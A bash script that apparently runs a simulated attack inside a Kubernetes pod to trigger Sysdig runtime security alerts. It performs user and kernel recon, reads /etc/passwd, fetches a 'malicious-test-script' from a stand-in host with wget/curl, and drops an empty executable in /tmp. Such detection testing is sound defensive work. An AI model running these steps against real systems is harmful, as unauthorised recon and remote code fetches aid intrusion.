#!/usr/bin/env bash
set -euo pipefail

NAMESPACE="${NAMESPACE:-voting-app}"
APP_LABEL="${APP_LABEL:-app=vote}"

echo "Locating target pod in namespace ${NAMESPACE} with label ${APP_LABEL}..."
POD_NAME=$(kubectl get pod -l "${APP_LABEL}" -n "${NAMESPACE}" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

if [[ -z "${POD_NAME}" ]]; then
    echo "Error: Could not find any running pod with label '${APP_LABEL}' in namespace '${NAMESPACE}'."
    echo "Ensure the voting application is deployed via: kubectl apply -f manifests/voting-app/ -n ${NAMESPACE}"
    exit 1
fi

echo "Target pod identified: ${POD_NAME}"

case "${1:-run}" in
    run)
        echo "Executing automated simulated adversary attack sequence inside ${POD_NAME}..."
        echo "-------------------------------------------------------------------------"
        echo "[1/4] Discovery reconnaissance: whoami, id, uname -a, reading /etc/passwd..."
        kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- /bin/sh -c '
            echo "--- User Recon ---" && whoami && id;
            echo "--- Kernel Info ---" && uname -a;
            echo "--- Sensitive File Access ---" && cat /etc/passwd | head -n 5;
        '
        echo ""
        echo "[2/4] Tool Ingress & Outbound Network Call: attempting wget / curl..."
        kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- /bin/sh -c '
            wget -T 2 -qO- http://example.com/malicious-test-script 2>/dev/null || curl -s -m 2 http://example.com/malicious-test-script 2>/dev/null || echo "Simulated egress call triggered."
        '
        echo ""
        echo "[3/4] File dropped in sensitive directory: creating /tmp/malicious_payload.sh..."
        kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- /bin/sh -c '
            touch /tmp/malicious_payload.sh && chmod +x /tmp/malicious_payload.sh && ls -la /tmp/malicious_payload.sh
        '
        echo ""
        echo "[4/4] Adversary cleanup / persistence check..."
        kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- /bin/sh -c '
            rm -f /tmp/malicious_payload.sh
        '
        echo "-------------------------------------------------------------------------"
        echo "Attack sequence complete! Verify runtime alerts in Sysdig Secure > Events > Runtime Events."
        ;;

    shell)
        echo "Opening interactive terminal shell inside ${POD_NAME}..."
        echo "Recommended live demo commands:"
        echo "  whoami"
        echo "  cat /etc/passwd"
        echo "  touch /tmp/malicious_payload.sh"
        echo "  exit"
        echo ""
        kubectl exec -it "${POD_NAME}" -n "${NAMESPACE}" -- /bin/sh
        ;;

    *)
        echo "Usage: $0 {run|shell}"
        echo "  run   - Execute automated simulated attack sequence"
        echo "  shell - Open interactive terminal shell inside container pod"
        exit 1
        ;;
esac
